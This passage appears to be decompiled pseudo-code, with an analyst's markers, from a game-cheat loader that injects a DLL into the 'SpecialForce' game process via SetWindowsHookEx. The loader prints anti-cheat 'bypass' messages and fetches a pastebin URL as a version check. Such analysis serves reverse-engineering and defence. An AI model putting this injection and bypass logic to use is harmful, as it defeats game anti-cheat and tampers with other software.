 *   - Injection status message
 *   - Game window/title match
 */

// ==== FUN_001c0fd0 @ 001c0fd0 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001c0fd0(void)

{
  code *pcVar1;
  int iVar2;
  int iVar3;
  char extraout_CH;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  char *extraout_EDX;
  code *unaff_EBX;
  char *pcVar4;
  undefined4 uVar5;
  undefined4 uStack_1c;
  undefined4 uStack_18;
  undefined4 uStack_14;
  uint local_c;
  
  local_c = DAT_00242400 ^ (uint)&uStack_1c;
  if (DAT_0035fcc4 == 3) {
    FUN_001b9b60();
    return;
  }
  FUN_001be9c0();
  FUN_001b30c0("[-] Bypassing (SF Rush)...",0x1a);
  iVar2 = FUN_001bd940();
  while (iVar2 == 0) {
    if (DAT_003606a0 < DAT_0023bd08) {
      DAT_003606a0 = DAT_003606a0 + _DAT_0023bc8c;
    }
    uStack_18 = 100;
    uStack_14 = 0;
    FUN_001c7b60();
    iVar2 = FUN_001bd940();
  }
  DAT_003606a0 = 0.95;
  FUN_001b30c0("[-] Hooking Game Module Threads...",0x22);
  FUN_004494f1(extraout_ECX);
  iVar3 = (*unaff_EBX)(L"SpecialForce",0);
  iVar2 = 0;
  uVar5 = extraout_ECX_00;
  do {
    if (iVar3 != 0) {
      uStack_1c = 0;
      iVar2 = FUN_006b01e4(uVar5,iVar3,&uStack_1c);
      if (iVar2 == 0) {
        uVar5 = 0x26;
        pcVar4 = "[ FAILED ] Pipeline verification drop.";
      }
      else {
        iVar3 = FUN_00745804(iVar2,
                             "C:\\Windows\\SetWindowsHookEx-Injector-master\\SetWindowsHookEx-Injector-master\\x86\\release\\bin\\e1c09d8a7f6e5d4c3b2a1f0e9d8c7b6a.dll"
                             ,0,1);
        if (iVar3 != 0) {
          uVar5 = FUN_00659eb0(iVar3,iVar3,"NextHook");
          FUN_0191f5d7(3,uVar5,iVar3,iVar2);
          *extraout_EDX = *extraout_EDX + extraout_CH;
          FUN_019345e0(iVar2,0,0x6a);
          DAT_003606a0 = 1.0;
          SimpleString::operator=
                    ((SimpleString *)&DAT_003605d4,
                     "[ SUCCESS ] SpecialForce Injected! Closing loader...");
          (*DAT_0021f1f4)(2000);
          FUN_001bd920();
          FUN_018ea075(0);
          pcVar1 = (code *)swi(3);
          (*pcVar1)();
          return;
        }
        uVar5 = 0x21;
        pcVar4 = "[ FAILED ] Engine injection leak.";
      }
      goto LAB_001c10ff;
    }
    iVar3 = (*unaff_EBX)(L"SpecialForce",0);
    FUN_001c7b60();
    iVar2 = iVar2 + 1;
    uVar5 = extraout_ECX_01;
  } while (iVar2 < 0x65);
  uVar5 = 0x1f;
  pcVar4 = "[ FAILED ] Game Window timeout.";
LAB_001c10ff:
  FUN_001b30c0(pcVar4,uVar5);
  return;
}

/*
 * FUNCTION FUN_001c6620 @ 0x001c6620  (VA = 0x160000 + RVA 0x66620)
 * MARKERS:
 *   - C2/pastebin fetch  https://pastebin.com/raw/*
 *   - Version check strings
 */

// ==== FUN_001c6620 @ 001c6620 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_001c6620(void)

{
  char cVar1;
  code *pcVar2;
  int iVar3;
  int iVar4;
  undefined4 uVar5;
  int *piVar6;
  char *pcVar7;
  undefined1 *extraout_EDX;
  undefined1 *puVar8;
  void *local_10;
  undefined *puStack_c;
  undefined4 uStack_8;
  
  puVar8 = (undefined1 *)((int)register0x00000010 + -4);
  uStack_8 = 0xffffffff;
  puStack_c = &DAT_0021d5cd;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  iVar3 = FUN_005becfe();
  if (iVar3 != 0) {
    FUN_005d3ed1(iVar3,2);
    iVar4 = FUN_01965fb8(extraout_EDX,iVar3,"https://pastebin.com/raw/pQd1KBtw",0,0,0x80800000);
    uVar5 = 0;
    if (iVar4 != 0) {
      uVar5 = FUN_01991951(iVar4);
    }
    FUN_0199eb0c(uVar5,iVar3);
    puVar8 = extraout_EDX;
  }
  iVar3 = FUN_001b7320();
  if (iVar3 == -1) {
    FUN_001b30c0();
    FUN_001c0e70();
    FUN_006f56ee(DAT_00360750,"Failed to connect to version server.");
    goto LAB_001c6939;
  }
  if (iVar3 == 0) {
    FUN_001b30c0();
    uVar5 = FUN_001c0e70();
    FUN_006dd937(uVar5,DAT_00360750,"Outdated loader version detected!");
    goto LAB_001c6939;
  }
  piVar6 = (int *)FUN_001c08d0();
  if (piVar6 != &DAT_003605bc) {
    if (0xf < DAT_003605d0) {
      if ((0xfff < DAT_003605d0 + 1) && (0x1f < (DAT_003605bc - *(int *)(DAT_003605bc + -4)) - 4U))
      goto LAB_001c695a;
      FUN_00217940();
    }
    DAT_003605bc = *piVar6;
    iRam003605c0 = piVar6[1];
    iRam003605c4 = piVar6[2];
    iRam003605c8 = piVar6[3];
    _DAT_003605cc = *(undefined8 *)(piVar6 + 4);
    piVar6[4] = 0;
    piVar6[5] = 0xf;
    *(undefined1 *)piVar6 = 0;
  }
  if (0xf < *(uint *)(puVar8 + -0x30)) {
    if ((0xfff < *(uint *)(puVar8 + -0x30) + 1) &&
       (0x1f < (*(int *)(puVar8 + -0x44) - *(int *)(*(int *)(puVar8 + -0x44) + -4)) - 4U))
    goto LAB_001c695a;
    FUN_00217940();
  }
  pcVar7 = &DAT_00360660;
  *(undefined4 *)(puVar8 + -0x34) = 0;
  *(undefined4 *)(puVar8 + -0x30) = 0xf;
  puVar8[-0x44] = 0;
  *(undefined4 *)(puVar8 + -0x2c) = 0;
  *(undefined4 *)(puVar8 + -0x28) = 0;
  *(undefined4 *)(puVar8 + -0x24) = 0;
  *(undefined4 *)(puVar8 + -0x20) = 0;
  *(undefined4 *)(puVar8 + -0x1c) = 0;
  *(undefined4 *)(puVar8 + -0x18) = 0;
  do {
    cVar1 = *pcVar7;
    pcVar7 = pcVar7 + 1;
  } while (cVar1 != '\0');
  FUN_001b1ed0();
  *(undefined4 *)(puVar8 + -4) = 0;
  if (*(int *)(puVar8 + -0x1c) == 0) {
    FUN_001b30c0();
    FUN_001c0e70();
LAB_001c68fd:
    FUN_01ac119a();
  }
  else {
    FUN_001b11e0(puVar8 + -0x2c);
    iVar3 = FUN_001b5dc0();
    if (iVar3 != 1) {
      if (iVar3 == -3) {
        FUN_001b30c0();
        FUN_001c0e70();
      }
      else if (iVar3 == -2) {
        FUN_001b30c0();
        FUN_001c0e70();
      }
      else {
        FUN_001b30c0();
        FUN_001c0e70();
      }
      goto LAB_001c68fd;
    }
    FUN_001b30c0();
    FUN_001c0e70();
    DAT_003606a4 = 1;
  }
  if (0xf < *(uint *)(puVar8 + -0x18)) {
    if ((0xfff < *(uint *)(puVar8 + -0x18) + 1) &&
       (0x1f < (*(int *)(puVar8 + -0x2c) - *(int *)(*(int *)(puVar8 + -0x2c) + -4)) - 4U)) {
LAB_001c695a:
      pcVar2 = (code *)swi(0x29);
      (*pcVar2)();
      pcVar2 = (code *)swi(3);
      (*pcVar2)();
      return;
    }
    FUN_00217940();
  }
LAB_001c6939:
  DAT_00360784 = 0;
  ExceptionList = *(void **)(puVar8 + -0xc);
  return;
}

/*
 * FUNCTION FUN_001cab40 @ 0x001cab40  (VA = 0x160000 + RVA 0x6ab40)
 * MARKERS:
 *   - Version check strings
 */

// ==== FUN_001cab40 @ 001cab40 (interesting=no) ====

undefined1 * FUN_001cab40(int param_1,undefined1 *param_2,uint param_3)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  
  if (param_3 == 0) {
switchD_001cab7d_caseD_2715:
    return (undefined1 *)0x0;
  }
  *param_2 = 0;
  if (param_1 < 0x2afa) {
    if (param_1 == 0x2af9) {
      pcVar2 = "Host not found";
    }
    else {
      switch(param_1) {
      case 0x2714:
        pcVar2 = "Call interrupted";
        break;
      default:
        goto switchD_001cab7d_caseD_2715;
      case 0x2719:
        pcVar2 = "Bad file";
        break;
      case 0x271d:
        pcVar2 = "Bad access";
        break;
      case 0x271e:
        pcVar2 = "Bad argument";
        break;
      case 0x2726:
        pcVar2 = "Invalid arguments";
        break;
      case 0x2728:
        pcVar2 = "Out of file descriptors";
        break;
      case 0x2733:
        pcVar2 = "Call would block";
        break;
      case 0x2734:
      case 0x2735:
        pcVar2 = "Blocking call in progress";
        break;
      case 0x2736:
        pcVar2 = "Descriptor is not a socket";
        break;
      case 0x2737:
        pcVar2 = "Need destination address";
        break;
      case 0x2738:
        pcVar2 = "Bad message size";
        break;
      case 0x2739:
        pcVar2 = "Bad protocol";
        break;
      case 0x273a:
        pcVar2 = "Protocol option is unsupported";
        break;
      case 0x273b:
        pcVar2 = "Protocol is unsupported";
        break;
      case 0x273c:
        pcVar2 = "Socket is unsupported";
        break;
      case 0x273d:
        pcVar2 = "Operation not supported";
        break;
      case 0x273e:
        pcVar2 = "Protocol family not supported";
        break;
      case 0x273f:
        pcVar2 = "Address family not supported";
        break;
      case 0x2740:
        pcVar2 = "Address already in use";
        break;
      case 0x2741:
        pcVar2 = "Address not available";
        break;
      case 0x2742:
        pcVar2 = "Network down";
        break;
      case 0x2743:
        pcVar2 = "Network unreachable";
        break;
      case 0x2744:
        pcVar2 = "Network has been reset";
        break;
      case 0x2745:
        pcVar2 = "Connection was aborted";
        break;
      case 0x2746:
        pcVar2 = "Connection was reset";
        break;
      case 0x2747:
        pcVar2 = "No buffer space";
        break;
      case 0x2748:
        pcVar2 = "Socket is already connected";
        break;
      case 0x2749:
        pcVar2 = "Socket is not connected";
        break;
      case 0x274a:
        pcVar2 = "Socket has been shut down";
        break;
      case 0x274b:
        pcVar2 = "Too many references";
        break;
      case 0x274c:
        pcVar2 = "Timed out";
        break;
      case 0x274d:
        pcVar2 = "Connection refused";
        break;
      case 0x274e:
        pcVar2 = "Loop??";
        break;
      case 0x274f:
        pcVar2 = "Name too long";
        break;
      case 0x2750:
        pcVar2 = "Host down";
        break;
      case 0x2751:
        pcVar2 = "Host unreachable";
        break;
      case 0x2752:
        pcVar2 = "Not empty";
        break;
      case 0x2753:
        pcVar2 = "Process limit reached";
        break;
      case 0x2754:
        pcVar2 = "Too many users";
        break;
      case 0x2755:
        pcVar2 = "Bad quota";
        break;
      case 0x2756:
        pcVar2 = "Something is stale";
        break;
      case 0x2757:
        pcVar2 = "Remote error";
        break;
      case 0x276b:
        pcVar2 = "Winsock library is not ready";
        break;
      case 0x276c:
        pcVar2 = "Winsock version not supported";
        break;
      case 0x276d:
        pcVar2 = "Winsock library not initialised";
        break;
      case 0x2775:
        pcVar2 = "Disconnected";
      }
    }
  }
  else if (param_1 == 0x2afa) {
    pcVar2 = "Host not found, try again";
  }
  else if (param_1 == 0x2afb) {
    pcVar2 = "Unrecoverable error in call to nameserver";
  }
  else {
    if (param_1 != 0x2afc) {
      return (undefined1 *)0x0;
    }
    pcVar2 = "No data record of requested type";
  }
  pcVar3 = pcVar2;
  do {
    cVar1 = *pcVar3;
    pcVar3 = pcVar3 + 1;
  } while (cVar1 != '\0');
  if ((uint)((int)pcVar3 - (int)(pcVar2 + 1)) < param_3) {
    pcVar3 = pcVar2;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
      pcVar3[(int)(param_2 + (-1 - (int)pcVar2))] = cVar1;
    } while (cVar1 != '\0');
  }
  return param_2;
}

/*
 * FUNCTION FUN_001dcf10 @ 0x001dcf10  (VA = 0x160000 + RVA 0x7cf10)
 * MARKERS:
 *   - DLL load into target
 */

// ==== FUN_001dcf10 @ 001dcf10 (interesting=no) ====

uint __fastcall FUN_001dcf10(undefined4 param_1,undefined4 param_2)

{
  char cVar1;
  int iVar2;
  int iVar3;
  code *pcVar4;
  char *pcVar5;
  char *pcVar6;
  char *unaff_ESI;
  char *pcVar7;
  uint uVar8;
  bool bVar9;
  
  uVar8 = 0;
  iVar2 = FUN_00745986(param_2,"kernel32");
  if (iVar2 == 0) {
    return 0;
  }
  iVar3 = FUN_006f409f(iVar2,"LoadLibraryExA");
  pcVar4 = (code *)(iVar3 + -0x1824748b);
  bVar9 = pcVar4 == (code *)0x0;
  FUN_006bee87();
  if (!bVar9) {
    if (pcVar4 == (code *)0x0) {
      uVar8 = FUN_019563ee();
      return uVar8 ^ 0x5e;
    }
    uVar8 = (*pcVar4)();
    return uVar8;
  }
  if (pcVar4 != (code *)0x0) {
    iVar3 = FUN_006d7b1b(iVar2,"AddDllDirectory");
    if (iVar3 != 0) {
      uVar8 = (*pcVar4)();
      return uVar8;
    }
  }
  iVar2 = FUN_01ae77f0(iVar2,0,0);
  if (iVar2 != 0) {
    pcVar5 = unaff_ESI;
    do {
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar1 != '\0');
    pcVar5 = (char *)(*DAT_00242000)(pcVar5 + iVar2 + (1 - (int)(unaff_ESI + 1)));
    if (pcVar5 != (char *)0x0) {
      iVar2 = func_0x007619fe();
      if (iVar2 != 0) {
        pcVar7 = pcVar5;
        do {
          pcVar6 = pcVar7;
          pcVar7 = pcVar6 + 1;
        } while (*pcVar6 != '\0');
        pcVar6[0] = '\\';
        pcVar6[1] = '\0';
        pcVar7 = pcVar5;
        do {
          pcVar6 = pcVar7;
          pcVar7 = pcVar6 + 1;
        } while (*pcVar6 != '\0');
        pcVar7 = unaff_ESI;
        do {
          cVar1 = *pcVar7;
          pcVar7 = pcVar7 + 1;
          pcVar7[(int)(pcVar6 + (-1 - (int)unaff_ESI))] = cVar1;
        } while (cVar1 != '\0');
        if (pcVar4 != (code *)0x0) {
          uVar8 = (*pcVar4)(pcVar5,0,8);
          (*DAT_00242004)(pcVar5);
          return uVar8;
        }
        uVar8 = FUN_006971b4(0,pcVar5);
      }
    }
    (*DAT_00242004)(pcVar5);
  }
  return uVar8;
}

/*
 * FUNCTION FUN_001e5de0 @ 0x001e5de0  (VA = 0x160000 + RVA 0x85de0)
 * MARKERS:
 *   - Version check strings
 */

// ==== FUN_001e5de0 @ 001e5de0 (interesting=no) ====

int FUN_001e5de0(int param_1,int param_2,int param_3,int *param_4)

{
  char *pcVar1;
  char cVar2;
  int iVar3;
  int iVar4;
  uint uVar5;
  undefined4 uVar6;
  int iVar7;
  char *pcVar8;
  undefined *puVar9;
  undefined *puVar10;
  int iVar11;
  uint uVar12;
  char *pcVar13;
  bool bVar14;
  undefined *puVar15;
  int iStack_8;
  int local_4;
  
  iVar3 = *(int *)(param_1 + 0x18);
  local_4 = param_1 + 0x8a0;
  *param_4 = 0;
  do {
    iVar7 = param_1 + 0x8a0;
    iVar4 = FUN_0021b2e0(param_2,10,param_3);
    if (iVar4 == 0) {
      iVar4 = thunk_FUN_001d1a40(iVar7,param_2,param_3);
      if (iVar4 != 0) {
        return iVar4;
      }
      *param_4 = *param_4 + param_3;
      if (*(int *)(param_1 + 0xc4) == 0) {
        uVar6 = FUN_001d1950(iVar7);
        uVar6 = FUN_001d1960(iVar7,uVar6);
        iVar4 = FUN_001e55f0(param_1,iVar3,uVar6);
        if (iVar4 == 2) {
          *(undefined1 *)(param_1 + 0x12d) = 0;
          FUN_001dbe70(iVar3,2);
          if (9 < *(byte *)(iVar3 + 0x4d4)) {
LAB_001e66a5:
            FUN_001d9870(param_1,"Invalid status line");
            return 8;
          }
          if (*(char *)(param_1 + 0x6d5) == '\0') {
LAB_001e668a:
            FUN_001d9870(param_1,"Received HTTP/0.9 when not allowed");
            return 1;
          }
          bVar14 = true;
          goto LAB_001e6411;
        }
      }
      break;
    }
    iVar11 = (iVar4 - param_2) + 1;
    iVar4 = thunk_FUN_001d1a40(iVar7,param_2,iVar11);
    if (iVar4 != 0) {
      return iVar4;
    }
    param_3 = param_3 - iVar11;
    param_2 = param_2 + iVar11;
    *param_4 = *param_4 + iVar11;
    if (*(int *)(param_1 + 0xc4) == 0) {
      uVar5 = FUN_001d1950(iVar7);
      uVar6 = FUN_001d1960(param_1 + 0x8a0);
      if ((*(uint *)(*(int *)(iVar3 + 0x260) + 0x44) & 0x40000) == 0) {
        uVar5 = FUN_001e5540(param_1,uVar6,uVar5);
      }
      else {
        bVar14 = 4 < uVar5;
        if (5 < uVar5) {
          uVar5 = 5;
        }
        iVar7 = FUN_001dfeb0("RTSP/",uVar6,uVar5);
        uVar5 = 2;
        if (iVar7 != 0) {
          uVar5 = (uint)bVar14;
        }
      }
      if (uVar5 == 2) {
        FUN_001dbe70(iVar3,2);
        if (9 < *(byte *)(iVar3 + 0x4d4)) goto LAB_001e66a5;
        if (*(char *)(param_1 + 0x6d5) == '\0') goto LAB_001e668a;
        *(undefined1 *)(param_1 + 0x12d) = 0;
        bVar14 = true;
        iVar7 = local_4;
        goto LAB_001e6411;
      }
    }
    iVar7 = param_1 + 0x8a0;
    pcVar8 = (char *)FUN_001d1960(iVar7);
    uVar5 = FUN_001d1950(iVar7);
    if ((*pcVar8 == '\n') || (*pcVar8 == '\r')) {
      FUN_001d97c0(param_1,1,pcVar8,uVar5);
      iVar4 = FUN_001da7d0(param_1,(-(*(int *)(param_1 + 0xd4) - 100U < 100) & 0x20U) + 4,pcVar8,
                           uVar5);
      if (iVar4 != 0) {
        return iVar4;
      }
      puVar15 = (undefined *)0x4b000;
      if (uVar5 < 0x4b000) {
        puVar9 = (undefined *)(*(int *)(param_1 + 0xbc) + uVar5);
        *(int *)(param_1 + 0xb8) = *(int *)(param_1 + 0xb8) + uVar5;
        puVar10 = (undefined *)(*(int *)(param_1 + 0xd78) + uVar5);
        *(undefined **)(param_1 + 0xd78) = puVar10;
        *(undefined **)(param_1 + 0xbc) = puVar9;
        if ((undefined *)0x4b000 < puVar9) goto LAB_001e65ef;
        if (&UNK_005dc001 <= puVar10) {
          puVar15 = &DAT_005dc000;
          puVar9 = puVar10;
          goto LAB_001e65ef;
        }
      }
      else {
        puVar9 = (undefined *)(*(int *)(param_1 + 0xbc) + uVar5);
        if (puVar9 != (undefined *)0x0) goto LAB_001e65ef;
      }
      FUN_001d1970(iVar7);
      if (*(int *)(param_1 + 0xd4) - 100U < 100) {
        uVar6 = *(undefined4 *)(param_1 + 0xb8);
      }
      else {
        uVar6 = 0;
      }
      *(undefined4 *)(param_1 + 0xc0) = uVar6;
      iVar7 = FUN_001e5690(param_1,param_2,param_3,&iStack_8);
      if (iVar7 != 0) {
        return iVar7;
      }
      param_3 = param_3 - iStack_8;
      param_2 = param_2 + iStack_8;
      *param_4 = *param_4 + iStack_8;
      if (*(char *)(param_1 + 0x12d) == '\0') break;
    }
    else {
      iVar7 = *(int *)(param_1 + 0xc4);
      uVar12 = 4;
      *(int *)(param_1 + 0xc4) = iVar7 + 1;
      if (iVar7 == 0) {
        *(undefined4 *)(param_1 + 0xd0) = 0;
        uVar12 = *(uint *)(*(int *)(iVar3 + 0x260) + 0x44);
        if ((uVar12 & 3) == 0) {
          if ((uVar12 & 0x40000) != 0) {
            cVar2 = *pcVar8;
            pcVar13 = pcVar8;
            while ((cVar2 != '\0' && ((cVar2 == ' ' || (cVar2 == '\t'))))) {
              pcVar1 = pcVar13 + 1;
              pcVar13 = pcVar13 + 1;
              cVar2 = *pcVar1;
            }
            iVar7 = (*DAT_0021f6f4)(pcVar13,"RTSP/",5);
            if (iVar7 == 0) {
              if ((((((9 < (byte)(pcVar13[5] - 0x30U)) || (pcVar13[6] != '.')) ||
                    (9 < (byte)(pcVar13[7] - 0x30U))) ||
                   ((pcVar13[8] != ' ' && (pcVar13[8] != '\t')))) ||
                  (9 < (byte)(pcVar13[9] - 0x30U))) ||
                 ((9 < (byte)(pcVar13[10] - 0x30U) || (9 < (byte)(pcVar13[0xb] - 0x30U))))) {
                return 8;
              }
              *(int *)(param_1 + 0xd4) =
                   (int)pcVar13[0xb] + ((int)pcVar13[10] + pcVar13[9] * 10) * 10 + -0x14d0;
              cVar2 = pcVar13[0xc];
              if (((cVar2 != ' ') && (cVar2 != '\t')) && (3 < (byte)(cVar2 - 10U))) {
                return 8;
              }
              *(undefined4 *)(param_1 + 0xd0) = 0xb;
              goto LAB_001e61ad;
            }
          }
LAB_001e659f:
          *(undefined1 *)(param_1 + 0x12d) = 0;
          break;
        }
        cVar2 = *pcVar8;
        pcVar13 = pcVar8;
        while ((cVar2 != '\0' && ((cVar2 == ' ' || (cVar2 == '\t'))))) {
          pcVar1 = pcVar13 + 1;
          pcVar13 = pcVar13 + 1;
          cVar2 = *pcVar1;
        }
        iVar7 = (*DAT_0021f6f4)(pcVar13,"HTTP/",5);
        if (iVar7 == 0) {
          iVar7 = (int)pcVar13[5];
          if (iVar7 != 0x31) {
            if ((iVar7 != 0x32) && (iVar7 != 0x33)) {
              FUN_001d9870(param_1,"Unsupported HTTP version in response");
              return 1;
            }
            if ((pcVar13[6] == ' ') || (pcVar13[6] == '\t')) {
              *(int *)(param_1 + 0xd0) = (iVar7 + -0x30) * 10;
              if (((byte)(pcVar13[7] - 0x30U) < 10) &&
                 (((byte)(pcVar13[8] - 0x30U) < 10 && ((byte)(pcVar13[9] - 0x30U) < 10)))) {
                *(int *)(param_1 + 0xd4) =
                     (int)pcVar13[9] + ((int)pcVar13[8] + pcVar13[7] * 10) * 10 + -0x14d0;
                cVar2 = pcVar13[10];
                if ((cVar2 == ' ') || ((cVar2 == '\t' || (('\t' < cVar2 && (cVar2 < '\x0e'))))))
                goto LAB_001e61ad;
              }
            }
            goto LAB_001e6004;
          }
          if ((pcVar13[6] != '.') ||
             (((cVar2 = pcVar13[7], cVar2 != '0' && (cVar2 != '1')) ||
              ((pcVar13[8] != ' ' && (pcVar13[8] != '\t')))))) {
LAB_001e60ba:
            FUN_001d9870(param_1,"Unsupported HTTP/1 subversion in response");
            return 1;
          }
          *(int *)(param_1 + 0xd0) = cVar2 + -0x26;
          if (((9 < (byte)(pcVar13[9] - 0x30U)) || (9 < (byte)(pcVar13[10] - 0x30U))) ||
             (9 < (byte)(pcVar13[0xb] - 0x30U))) goto LAB_001e60ba;
          *(int *)(param_1 + 0xd4) =
               (int)pcVar13[0xb] + ((int)pcVar13[10] + pcVar13[9] * 10) * 10 + -0x14d0;
          cVar2 = pcVar13[0xc];
          if (((cVar2 != ' ') && (cVar2 != '\t')) && (3 < (byte)(cVar2 - 10U))) goto LAB_001e60ba;
        }
        else {
LAB_001e6004:
          iVar7 = FUN_001e5540(param_1,pcVar8,uVar5);
          if (iVar7 != 1) goto LAB_001e659f;
          *(undefined4 *)(param_1 + 0xd4) = 200;
          *(undefined4 *)(param_1 + 0xd0) = 10;
        }
LAB_001e61ad:
        iVar7 = *(int *)(param_1 + 0xd0);
        if ((iVar7 != 10) && (iVar7 != 0xb)) {
          FUN_001d9870(param_1,"Unsupported HTTP version (%u.%d) in response",iVar7 / 10,iVar7 % 10)
          ;
          return 1;
        }
        *(char *)(iVar3 + 0x4d4) = (char)iVar7;
        *(undefined4 *)(param_1 + 0xd38) = *(undefined4 *)(param_1 + 0xd4);
        *(undefined4 *)(param_1 + 0xd40) = *(undefined4 *)(param_1 + 0xd0);
        *(undefined1 *)(iVar3 + 0x4d4) = *(undefined1 *)(param_1 + 0xd0);
        if (*(byte *)(param_1 + 0xd15) == 0) {
          uVar12 = (uint)*(byte *)(param_1 + 0xd0);
LAB_001e6211:
          *(char *)(param_1 + 0xd15) = (char)uVar12;
          uVar12 = *(uint *)(param_1 + 0xd0);
        }
        else {
          uVar12 = *(uint *)(param_1 + 0xd0);
          if ((int)uVar12 < (int)(uint)*(byte *)(param_1 + 0xd15)) goto LAB_001e6211;
        }
        if (((*(int *)(param_1 + 0xbf8) != 0 || *(int *)(param_1 + 0xbfc) != 0) &&
            (*(char *)(param_1 + 0xd16) == '\0')) && (*(int *)(param_1 + 0xd4) == 0x1a0)) {
          *(undefined1 *)(param_1 + 0x136) = 1;
        }
        if (uVar12 == 10) {
          FUN_001d9940(param_1,"HTTP 1.0, assume close after body");
          FUN_001dbe70(iVar3,1);
        }
        else if ((uVar12 == 0x14) ||
                ((*(int *)(param_1 + 0xdc) == 2 && (*(int *)(param_1 + 0xd4) == 0x65)))) {
          **(undefined4 **)(iVar3 + 0x4a8) = 2;
        }
        iVar7 = *(int *)(param_1 + 0xd4);
        *(bool *)(param_1 + 0x137) = iVar7 - 100U < 100;
        if (iVar7 == 0xcc) {
LAB_001e62b8:
          *(undefined4 *)(param_1 + 0x88) = 0;
          *(undefined4 *)(param_1 + 0x8c) = 0;
          *(undefined4 *)(param_1 + 0x90) = 0;
          *(undefined4 *)(param_1 + 0x94) = 0;
          *(undefined1 *)(param_1 + 0x137) = 1;
        }
        else if (iVar7 == 0x130) {
          if (*(char *)(param_1 + 0x3b0) != '\0') {
            *(undefined1 *)(param_1 + 0xdf8) = 1;
          }
          goto LAB_001e62b8;
        }
        uVar12 = 0xc;
      }
      pcVar13 = (char *)FUN_001d1960(param_1 + 0x8a0);
      uVar6 = FUN_001d1950(param_1 + 0x8a0);
      iVar7 = FUN_0021b2e0(pcVar13,0,uVar6);
      if (iVar7 != 0) {
        FUN_001d9870(param_1,"Nul byte in header");
        return 8;
      }
      if ((1 < *(int *)(param_1 + 0xc4)) &&
         ((((*pcVar13 != ' ' && (*pcVar13 != '\t')) || (*(int *)(param_1 + 0xc4) < 3)) &&
          (iVar7 = FUN_0021b2e0(pcVar13,0x3a,uVar6), iVar7 == 0)))) {
        FUN_001d9870(param_1,"Header without colon");
        return 8;
      }
      iVar7 = FUN_001e3b70(param_1,iVar3,pcVar8,uVar5);
      if (iVar7 != 0) {
        return iVar7;
      }
      FUN_001d97c0(param_1,1,pcVar8,uVar5);
      if (*(int *)(param_1 + 0xd4) - 100U < 100) {
        uVar12 = uVar12 | 0x20;
      }
      iVar7 = FUN_001da7d0(param_1,uVar12,pcVar8,uVar5);
      if (iVar7 != 0) {
        return iVar7;
      }
      iVar7 = *(int *)(param_1 + 0xbc);
      if (uVar5 < 0x4b000) {
        *(int *)(param_1 + 0xb8) = *(int *)(param_1 + 0xb8) + uVar5;
        puVar9 = (undefined *)(*(int *)(param_1 + 0xd78) + uVar5);
        *(undefined **)(param_1 + 0xd78) = puVar9;
        *(uint *)(param_1 + 0xbc) = iVar7 + uVar5;
        if (0x4b000 < iVar7 + uVar5) goto LAB_001e65cb;
        if (&DAT_005dc000 < puVar9) {
          puVar15 = &DAT_005dc000;
          goto LAB_001e65ef;
        }
      }
      else if (iVar7 + uVar5 != 0) {
LAB_001e65cb:
        puVar9 = (undefined *)(iVar7 + uVar5);
        puVar15 = (undefined *)0x4b000;
LAB_001e65ef:
        FUN_001d9870(param_1,"Too large response headers: %zu > %u",puVar9,puVar15);
        return 0x38;
      }
      FUN_001d1970(param_1 + 0x8a0);
    }
  } while (param_3 != 0);
  bVar14 = false;
  iVar7 = param_1 + 0x8a0;
LAB_001e6411:
  if ((*(char *)(param_1 + 0x12d) == '\0') && (!bVar14)) {
    FUN_001d1900(iVar7);
  }
  return 0;
}

/*
 * FUNCTION FUN_001ec430 @ 0x001ec430  (VA = 0x160000 + RVA 0x8c430)
 * MARKERS:
 *   - Version check strings
 */

// ==== FUN_001ec430 @ 001ec430 (interesting=no) ====

/* WARNING: Function: __security_check_cookie replaced with injection: security_check_cookie */
/* WARNING: Instruction at (ram,0x001ec921) overlaps instruction at (ram,0x001ec91c)
    */
/* WARNING: Removing unreachable block (ram,0x001eca89) */

char * FUN_001ec430(int param_1,int param_2)

{
  code *pcVar1;
  undefined6 uVar2;
  uint3 uVar3;
  short sVar4;
  int *piVar5;
  char cVar6;
  int iVar7;
  char *pcVar8;
  int iVar9;
  undefined1 *puVar10;
  char *pcVar11;
  undefined4 uVar12;
  undefined4 uVar13;
  undefined4 *puVar14;
  char *pcVar15;
  undefined1 uVar16;
  char extraout_CH;
  uint extraout_ECX;
  undefined4 extraout_ECX_00;
  uint uVar17;
  undefined4 extraout_ECX_01;
  char cVar18;
  undefined2 uVar19;
  char cVar21;
  uint *puVar20;
  uint uVar22;
  undefined2 *puVar23;
  undefined2 *puVar24;
  char *pcVar25;
  wchar_t *pwVar26;
  undefined4 unaff_EDI;
  int iVar27;
  bool bVar28;
  bool bVar29;
  undefined8 uVar30;
  uint uVar31;
  undefined4 uStack_1a4;
  undefined2 uStack_1a0;
  char cStack_19e;
  char cStack_19d;
  int local_19c;
  uint local_198;
  int local_194;
  char *local_190;
  undefined4 local_18c;
  undefined4 local_188;
  undefined2 uStack_184;
  undefined2 uStack_182;
  undefined4 local_180;
  undefined2 uStack_17c;
  undefined2 uStack_17a;
  int local_178;
  char *local_174;
  int local_170;
  undefined4 *local_16c;
  int local_168;
  undefined4 local_164;
  int *local_160;
  undefined1 auStack_15c [8];
  undefined4 uStack_154;
  undefined4 uStack_150;
  int *piStack_14c;
  int *piStack_148;
  int iStack_13c;
  undefined4 **ppuStack_138;
  uint uStack_134;
  undefined4 uStack_130;
  undefined4 *puStack_12c;
  undefined4 *puStack_124;
  undefined4 uStack_11c;
  undefined4 uStack_118;
  uint uStack_114;
  char *pcStack_110;
  undefined8 uStack_10c;
  undefined4 *puStack_104;
  undefined4 uStack_100;
  undefined4 *apuStack_fc [2];
  int iStack_f4;
  undefined8 uStack_f0;
  undefined1 auStack_e8 [228];
  uint local_4;
  
  local_4 = DAT_00242400 ^ (uint)&uStack_1a4;
  local_19c = param_2;
  iVar27 = *(int *)(param_1 + 8);
  local_170 = FUN_001d6ab0(param_1);
  iVar7 = FUN_001d6a90(param_1,param_2);
  iVar9 = local_170;
  local_194 = 0;
  local_160 = *(int **)(iVar27 + 0x1c);
  uVar22 = 0;
  if (*(char *)(local_170 + 0x39) == '\0') {
    puVar14 = (undefined4 *)0x1808;
  }
